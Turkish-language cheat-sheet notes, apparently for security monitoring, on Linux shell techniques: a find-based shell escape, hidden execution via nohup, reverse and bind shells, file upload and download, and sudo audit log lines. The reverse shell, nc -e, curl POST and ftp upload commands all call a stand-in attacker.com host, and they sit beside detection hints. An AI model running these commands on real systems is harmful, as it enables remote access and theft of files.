* ***cat /etc/shells**
mevcut tüm shell'lerin listesini gösterir.

------

 ==***Shell**==
Mevcut shell/kabuk listesi cat /etc/shells
kısıtlı shell’den daha etkileşimli shell elde etmek amacıyla kullanılır.

•	find . -exec /bin/sh \; -quit
Örnek olarak find komut ile kullanımı. Etkileşimli shell şu faydaları sağlar:

•	PTY/tty erişimi.
•	Parola/şifre isteyen programları çalıştırma imkanı.
•	Etkileşimli editörler (vim, nano) kullanılabilir.
•	Komut geçmişi ve geri alma (history).

-----

==Interactive Shell==
•	ls
•	cd home

**non-interactive** neden kullanılır, Saldırgan komutları terminalde görünmez
•	kedi='/usr/bin/id'
•	nohup "$kedi" 
bu şekilde bir değişkenini(kedi) içerisine zararlı kod veya öğrenilmek istenen bilgi için komut 
yerleştirilip çalıştırılabilir buna 'non-interactive' denir.
**cat nohup.out** denildiğinde komut çıktısı bu şekilde **uid=0(root) gid=0(root) groups=0(root)**

-----

==**Reverse Shell**==
C2 sunucusu ile iletişim kurulması için 
•	export RHOST=attacker.com
•	export RPORT=12345
•	bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
•	nc -e /bin/sh $RHOST $RPORT
Tespiti için; 
•	export -p değişkenler gözlemlenmeli.
•	/dev/tcp veya /dev/udp veya /bin/sh komut satırında aranmalı

----

==**Bind Shell**==
Hedef sistemde bir port açılır ve saldırgan bu port üzerinden hedefe bağlanır.

**File upload**
URL=http://attacker.com
LFILE=file_to_send
curl -X POST -d @$file_to_send $URL

RHOST=attacker.com
ftp $RHOST
put file_to_send

-----

==**File Download**==

URL=http://attacker.com/file_to_get
LFILE=file_to_save
wget $URL -O $LFILE

----

==**Sudo**==

sudo -l çıktılarını takip et.

type=CWD komutun çalıştırılan dizini gösterir.
msg=audit değeri burada aranabilir

type=EXECVE msg=audit(1676018559.265:6371): argc=3 a0="sudo" a1="cat" a2="/etc/sudoers"
type=CWD msg=audit(1676018559.265:6371):  cwd="/home/vivek"
bu komutun çalıştırıldığı dizin "/home/vivek"

